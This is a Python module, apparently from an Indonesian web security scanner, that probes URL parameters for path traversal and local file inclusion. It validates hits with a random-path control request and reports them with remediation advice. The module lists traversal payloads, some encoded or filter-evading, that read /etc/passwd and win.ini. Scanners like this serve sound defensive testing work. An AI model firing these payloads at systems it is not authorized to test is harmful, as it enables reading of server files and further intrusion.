"""Local File Inclusion / Path Traversal probes — strict-validation v0.10.1.

Validation pipeline (untuk hindari false-positive):
  1. Probe payload mengembalikan signature kanonik (root: di /etc/passwd
     atau [fonts]/[extensions] di win.ini).
  2. Re-fetch dengan path random (cyberloka_<rand>) — TIDAK boleh balas
     signature yang sama (kalau iya, berarti server selalu echo body itu ⇒
     bukan LFI sungguhan, false-positive).
  3. Body bukan SPA shell.
"""
from __future__ import annotations

import re
import secrets

from cyberloka.active._helpers import append_param, candidate_urls, iter_param_urls
from cyberloka.core import (
    Finding,
    HttpClient,
    Severity,
    Target,
    ValidationProof,
    build_extra,
    is_soft_200,
    looks_like_html_shell,
)
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate
from cyberloka.reporting.awam import get_awam

PAYLOADS = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "C:\\windows\\win.ini",
]

PASSWD_RE = re.compile(r"root:[x*]:0:0:")
WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]", re.I)


def _has_signature(body: str) -> str | None:
    if PASSWD_RE.search(body):
        return "/etc/passwd"
    if WIN_INI_RE.search(body):
        return "win.ini"
    return None


def _scan_url(client, url, awam_summary, awam_steps):
    findings: list[Finding] = []
    if True:
        for payload in PAYLOADS:
            for param, mutated in iter_param_urls(url, payload):
                resp = client.get(mutated)
                if resp is None or is_soft_200(resp):
                    continue
                body = resp.text or ""
                if looks_like_html_shell(body):
                    continue
                sig = _has_signature(body)
                if not sig:
                    continue

                # Validation step: kirim payload random — kalau server tetap
                # balas signature yang sama, berarti server selalu echo body
                # tertentu (bukan benar-benar membaca file). Reject finding.
                random_payload = f"cyberloka_{secrets.token_hex(4)}"
                ctrl_url = next(
                    (u for _, u in iter_param_urls(url, random_payload)),
                    None,
                )
                ctrl = client.get(ctrl_url) if ctrl_url else None
                ctrl_body = (ctrl.text or "") if ctrl is not None else ""
                if _has_signature(ctrl_body):
                    # Server echoes signature regardless → false positive.
                    continue

                proof = ValidationProof(
                    method="signature+control-fetch",
                    confirmed=True,
                    steps=[
                        f"Kirim payload path-traversal ke parameter `{param}`.",
                        f"Response memuat signature `{sig}` (kanonik).",
                        f"Kontrol: kirim payload random `{random_payload}` ke param yang sama.",
                        "Response kontrol TIDAK memuat signature → server benar-benar membaca file.",
                    ],
                    samples=[truncate(body, 200)],
                    notes=(
                        f"Soft-200 / SPA shell dicek dan ditolak. "
                        f"len(payload-resp)={len(body)} len(ctrl-resp)={len(ctrl_body)}"
                    ),
                )
                findings.append(
                    Finding(
                        module="lfi",
                        title=f"Local File Inclusion / Path Traversal pada `{param}`",
                        severity=Severity.CRITICAL,
                        description=(
                            "Konten file sistem (mis. /etc/passwd atau win.ini) berhasil "
                            "diakses lewat parameter aplikasi. Validasi: kontrol fetch "
                            "tidak memuat signature, jadi bukan echo statis."
                        ),
                        target=mutated,
                        evidence=truncate(body, 240),
                        cwe="CWE-22",
                        confidence="confirmed",
                        urls=[mutated],
                        remediation=(
                            "Jangan menerima path file dari user. Gunakan whitelist nama "
                            "file/identifier dan map ke path internal. Lakukan canonicalisasi "
                            "path lalu cek apakah tetap di dalam direktori yang diizinkan."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Path_Traversal",
                        ],
                        extra=build_extra(
                            proof=proof,
                            awam_steps=awam_steps,
                            awam_summary=awam_summary,
                        ),
                    )
                )
                return findings  # one strong finding is enough
    return findings


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    awam_summary, awam_steps = get_awam("lfi")
    seen_paths: set[str] = set()
    try:
        from urllib.parse import urlparse
        for url in candidate_urls(target, config, fallback_param="file", fallback_value="index"):
            path = urlparse(url).path
            if path in seen_paths:
                continue
            for f in _scan_url(client, url, awam_summary, awam_steps):
                seen_paths.add(path)
                findings.append(f)
    finally:
        client.close()
    return findings
